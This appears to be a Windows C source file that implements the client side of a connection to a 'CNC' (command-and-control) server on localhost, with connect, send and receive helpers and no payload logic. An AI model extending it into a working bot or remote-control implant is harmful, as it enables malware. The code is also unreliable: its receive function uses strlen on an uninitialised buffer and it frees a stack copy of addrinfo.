#define _WIN32_WINNT 0x501

#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#define CNC_HOST "127.0.0.1"
#define CNC_PORT "26016"

SOCKET *cnc = NULL;

void initwinsock() {
  int res;
  WSADATA wsaData;
  res = WSAStartup(MAKEWORD(2, 2), &wsaData);
  if (res != 0) {
    printf("WSAStartup failed: %d\n", res);
    exit(1);
  }
}

struct addrinfo getcncinfo() {
  int res;
  struct addrinfo *result = NULL, hints = {.ai_family = AF_UNSPEC,
                                           .ai_socktype = SOCK_STREAM,
                                           .ai_protocol = IPPROTO_TCP};
  res = getaddrinfo(CNC_HOST, CNC_PORT, &hints, &result);
  if (res != 0) {
    printf("getaddrinfo failed: %d\n", res);
    WSACleanup();
    exit(1);
  }
  return *result;
}

void initcncsock() {
  struct addrinfo cncinfo = getcncinfo();
  SOCKET *conn = malloc(sizeof(SOCKET));
  *conn = socket(cncinfo.ai_family, cncinfo.ai_socktype, cncinfo.ai_protocol);
  if (*conn == INVALID_SOCKET) {
    printf("Error at socket(): %ld\n", WSAGetLastError());
    freeaddrinfo(&cncinfo);
    WSACleanup();
    exit(1);
  } else {
    cnc = conn;
  }
}

void connectcnc() {
  struct addrinfo cncinfo = getcncinfo();
  int res = connect(*cnc, cncinfo.ai_addr, cncinfo.ai_addrlen);
  if (res == SOCKET_ERROR) {
    printf("Unable to connect to CNC.\n");
    printf("Error at connect(): %ld\n", WSAGetLastError());
    WSACleanup();
    exit(1);
  }
}

void startclient() {
  initwinsock();
  initcncsock();
  connectcnc();
}

void sendtocnc(char *buf) {
  int res = send(*cnc, buf, strlen(buf), 0);
  if (res == SOCKET_ERROR) {
    printf("send failed: %d\n", WSAGetLastError());
    exit(1);
  }
}

char *recvfromcnc(int buffsize) {
  char *buf = malloc(buffsize);
  int res = recv(*cnc, buf, strlen(buf), 0);
  if (res == SOCKET_ERROR) {
    printf("recv failed: %d\n", WSAGetLastError());
    exit(1);
  }
  return buf;
}